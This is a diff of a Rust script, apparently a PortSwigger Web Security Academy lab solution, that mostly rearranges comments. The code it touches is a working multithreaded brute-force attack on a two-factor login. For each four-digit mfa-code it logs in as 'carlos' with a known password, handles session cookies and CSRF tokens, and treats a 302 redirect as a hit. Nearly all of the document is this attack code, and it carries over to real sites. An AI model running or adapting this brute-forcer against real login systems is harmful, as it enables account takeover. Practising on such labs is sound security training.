@@ -60,11 +60,20 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
+    // change this to your lab URL
+    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // make the ranges ready to run them in multiple threads
+    let ranges = build_ranges();
+
+    // capture the time before starting
     let start_time = time::Instant::now();
-    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
-    let ranges = build_ranges(); // make the ranges ready to run them in multiple threads
-    brute_force_2fa(start_time, &client, url, ranges); // start brute forcing the mfa-code
+
+    // start brute forcing the mfa-code
+    brute_force_2fa(start_time, &client, url, ranges);
 
     // when using multithreads some request will fail due to unknown issues
     // the next few lines will try the failed codes again
@@ -73,16 +82,24 @@ fn main() {
         .unwrap()
         .iter()
         .map(|f| f.parse::<i32>().unwrap())
-        .collect(); // make a list of integers codes; this is a rust-related statment; not to care too much about
-    let total_failed_codes = failed_codes.len(); // get the total number of failed codes
+        .collect();
+
+    // get the total number of failed codes
+    let total_failed_codes = failed_codes.len();
+
+    // specify how many codes will be tried in every thread
+    // 4 is the number of threads
     let failed_chunkes: Vec<Vec<i32>> = failed_codes
-        .chunks(total_failed_codes / 4) // specify how many codes will be tried in every thread; 4 is the number of threads
+        .chunks(total_failed_codes / 4)
         .map(|f| f.to_owned())
         .collect();
 
     println!("{}", "\n[#] Retrying the failed codes..".white().bold());
-    brute_force_2fa(start_time, &client, url, failed_chunkes); // try the failed codes
 
+    // try the failed codes again
+    brute_force_2fa(start_time, &client, url, failed_chunkes);
+
+    // print some useful information to the terminal
     println!("\n{}", "[!] No valid code is found".red().bold());
     print_finish_message(start_time);
     print_failed_requests();
@@ -97,19 +114,24 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str, ranges: Vec<
         "[#] Brute forcing the mfa-code of".white().bold(),
         "carlos".green().bold()
     );
+    // run every subrange in a different thread
     ranges.par_iter().for_each(|minilist| {
-        // run every subrange in a different thread
+        // iterate over codes in every subrange
         for code in minilist {
-            // iterate over codes in every subrange
+            // iterate only if no valid code is found; this condition keeps the all threads from continuing if a valid code is found
             if VALID_CODE.lock().unwrap().len() == 0 {
-                // iterate only if no valid code is found; this condition keeps the all threads from continuing if a valid code is found
-                let get_login = client.get(format!("{url}/login").as_str()).send(); // GET /login page
+                // GET /login page
+                let get_login = client.get(format!("{url}/login").as_str()).send();
 
+                // if you GET /login successfully
                 if let Ok(get_login_res) = get_login {
-                    // if you GET /login successfully
-                    let get_login_session = extract_session_cookie(get_login_res.headers()); // get the new session
-                    let get_login_csrf = extract_csrf(get_login_res); // get the csrf token
+                    // get the new session
+                    let get_login_session = extract_session_cookie(get_login_res.headers());
 
+                    // get the csrf token
+                    let get_login_csrf = extract_csrf(get_login_res);
+
+                    // try to login with valid credentials
                     let post_login = client
                         .post(format!("{url}/login"))
                         .header("Cookie", format!("session={get_login_session}"))
@@ -118,18 +140,25 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str, ranges: Vec<
                             ("password", "montoya"),
                             ("csrf", &get_login_csrf),
                         ]))
-                        .send(); // try to login with valid credentials
+                        .send();
 
+                    // if you logged in successfully
                     if let Ok(post_login_res) = post_login {
-                        // if you logged in successfully
-                        let post_login_session = extract_session_cookie(post_login_res.headers()); // get the new session
+                        // get the new session
+                        let post_login_session = extract_session_cookie(post_login_res.headers());
+
+                        // GET /login2 with the new session
                         let get_login2 = client
                             .get(format!("{url}/login2"))
                             .header("Cookie", format!("session={post_login_session}"))
-                            .send(); // GET /login2 with the new session
+                            .send();
+
+                        // if you GET /login2 successfully
                         if let Ok(get_login2_res) = get_login2 {
-                            // if you GET /login2 successfully
-                            let get_login2_csrf = extract_csrf(get_login2_res); // get the new csrf token
+                            // get the new csrf token
+                            let get_login2_csrf = extract_csrf(get_login2_res);
+
+                            // try to POST the mfa-code with the new session and the new csrf token
                             let post_code = client
                                 .post(format!("{url}/login2"))
                                 .header("Cookie", format!("session={post_login_session}"))
@@ -137,19 +166,22 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str, ranges: Vec<
                                     ("csrf", &get_login2_csrf),
                                     ("mfa-code", &format!("{code:04}")),
                                 ]))
-                                .send(); // try to POST the mfa-code with the new session and the new csrf token
+                                .send();
 
+                            // if POST code is done successfully
                             if let Ok(post_code_res) = post_code {
-                                // if POST code is done successfully
+                                // if a redirect happens; this means a valid code
                                 if post_code_res.status().as_u16() == 302 {
-                                    // if a redirect happens; this means a valid code
                                     println!(
                                         "\n✅ {}: {}",
                                         "Correct code".white().bold(),
                                         format!("{code:04}").green().bold(),
                                     );
+
+                                    // get the new session
                                     let new_session =
-                                        extract_session_cookie(post_code_res.headers()); // get the new session
+                                        extract_session_cookie(post_code_res.headers());
+
                                     println!(
                                         "{}: {}",
                                         "✅ New session".white().bold(),
@@ -162,10 +194,16 @@ fn brute_force_2fa(start_time: Instant, client: &Client, url: &str, ranges: Vec<
                                             .bold(),
                                         "carlos".green().bold()
                                     );
+
+                                    // update the valid code global variable
                                     VALID_CODE.lock().unwrap().push_str(&format!("{code:04}"));
+
+                                    // print some useful information to the terminal
                                     print_finish_message(start_time);
                                     print_failed_requests();
-                                    process::exit(0); // exit the program after printing useful information to the terminal
+
+                                    // exit from the program
+                                    process::exit(0);
                                 } else {
                                     // if the submitted code is incorrect
                                     print!(
